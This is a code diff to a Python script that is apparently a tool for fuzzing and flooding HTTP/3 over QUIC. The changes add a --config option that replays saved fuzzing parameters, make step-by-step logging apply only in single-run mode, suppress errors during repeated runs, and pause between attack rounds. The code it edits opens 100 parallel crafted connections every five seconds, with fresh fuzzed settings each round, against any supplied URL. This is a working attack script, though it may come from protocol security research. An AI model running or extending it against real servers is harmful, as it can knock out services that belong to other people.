@@ -754,38 +754,37 @@ def execute_attack(configuration: QuicConfiguration, fuzzing_conf: FuzzingConf, 
         h3client = HttpClient(configuration, fuzzing_conf, urlparse(url).netloc)
 
         # Step 2: Establish the initial connection (handshake)
-        print("\033[93m\n[Establishing connection via Crypto message...]\033[0m")
+        if once: print("\033[93m\n[Establishing connection via Crypto message...]\033[0m")
         h3client.connect()
         h3client.read_from_buffer()  # Receive any response from the server
 
         # Step 3: Complete the connection (finish handshake)
-        print("\033[93m\n[Finishing handshake using Handshake message...]\033[0m")
+        if once: print("\033[93m\n[Finishing handshake using Handshake message...]\033[0m")
         h3client.complete_connection()
         h3client.read_from_buffer()  # Receive any response from the server
 
-        print("\033[93m\n[Opening Control Stream...]\033[0m")
+        if once: print("\033[93m\n[Opening Control Stream...]\033[0m")
         h3client.open_qpack_streams()
         #h3client.read_from_buffer()
 
-        print("\033[93m\n[Sending HEADERS frame...]\033[0m")
+        if once: print("\033[93m\n[Sending HEADERS frame...]\033[0m")
         headers_data = h3client.craft_sample_headers_frame()
         h3client.send_quic_stream(headers_data)
         #h3client.read_from_buffer()
     except Exception as e:
-        if once:
-            print(traceback.format_exc())
-        else:
-            print(str(e))
+        if once: print(traceback.format_exc())
+        else: pass #print(str(e))
 
 
 def main(
     configuration: QuicConfiguration,
     url: str,
-    once: bool
+    once: bool,
+    config_file: str = None # replicate fuzzing by reading values from a json file
 ) -> None:
 
     if once:
-        fuzzing_conf = FuzzingConf()
+        fuzzing_conf = FuzzingConf(config_file)
         execute_attack(configuration, fuzzing_conf, url, once)
         sys.exit()
 
@@ -793,21 +792,23 @@ def main(
     def run_attack():
         with concurrent.futures.ThreadPoolExecutor() as executor:
             futures = []
-            print("\033[31mStart running the attack for {} seconds with parallel {} connections and {} sec interval\033[0m".format(60, 100, 5))
+            print("\033[31mStart running the attack for {} seconds with {} parallel connections and {} sec interval\033[0m".format(60, 100, 5))
             
             while time.time() - attack_start_time < 61:                
                 for i in range(100):
                     # Submit each iteration as a separate task
-                    futures.append(executor.submit(execute_attack, configuration, fuzzing_conf, url))
+                    futures.append(executor.submit(execute_attack, configuration, fuzzing_conf, url, once))
                 time.sleep(5)
 
 
     while True: # new attack parameters at every iteration
-        fuzzing_conf = FuzzingConf()
+        fuzzing_conf = FuzzingConf(config_file)
         attack_start_time = time.time()
         attack_start_time_pretty = datetime.fromtimestamp(attack_start_time).strftime('%Y-%m-%d %H:%M:%S')
-        print("\033[31mNew Attack Start at {}\033[0m".format(attack_start_time_pretty))
+        print("\033[31mNew Attack Starts at {}\033[0m".format(attack_start_time_pretty))
         run_attack()
+        print("\033[31mAttack Completes at {}\033[0m".format(attack_start_time_pretty))
+        time.sleep(60)
         
 
     
@@ -879,6 +880,12 @@ if __name__ == "__main__":
     parser.add_argument(
         "--once", action="store_true", help="Execute the attack once (for testing purposes)"
     )
+    parser.add_argument(
+        "--config",
+        type=str,
+        help="json file that contains parameters of past fuzzing to replicate"
+    )
+
 
     args = parser.parse_args()
 
@@ -910,7 +917,8 @@ if __name__ == "__main__":
     main(
             configuration=configuration,
             url=args.url,
-            once=args.once
+            once=args.once,
+            config_file=args.config
         )
     
     
